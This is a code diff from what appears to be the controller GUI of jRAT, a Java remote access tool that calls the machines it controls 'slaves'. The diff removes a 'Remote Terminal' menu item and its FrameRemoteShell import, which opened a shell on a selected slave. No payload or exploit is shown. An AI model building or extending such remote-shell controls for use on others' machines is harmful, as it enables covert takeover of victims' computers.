@@ -14,7 +14,6 @@ import jrat.controller.settings.StoreOfflineSlaves;
 import jrat.controller.threads.ThreadUploadFile;
 import jrat.controller.ui.dialogs.DialogFileType;
 import jrat.controller.ui.frames.FrameControlPanel;
-import jrat.controller.ui.frames.FrameRemoteShell;
 import jrat.controller.ui.frames.FrameRename;
 import jrat.controller.ui.frames.FrameSystemInfo;
 import jrat.controller.utils.NetUtils;
@@ -272,19 +271,6 @@ public abstract class PanelMainClients extends JScrollPane {
 			}
 		});
 		mntmVisitUrl.setIcon(Resources.getIcon("application-browser"));
-
-		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
-		mntmRemoteCmd.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent e) {
-				AbstractSlave slave = getSelectedSlave();
-				if (slave != null && slave instanceof Slave) {
-					FrameRemoteShell frame = new FrameRemoteShell((Slave) slave);
-					frame.setVisible(true);
-				}
-			}
-		});
-		mntmRemoteCmd.setIcon(Resources.getIcon("terminal"));
-		mnQuickOpen.add(mntmRemoteCmd);
 
 		JMenu mnTools_1 = new JMenu("Tools");
 		mnTools_1.setIcon(Resources.getIcon("toolbox"));
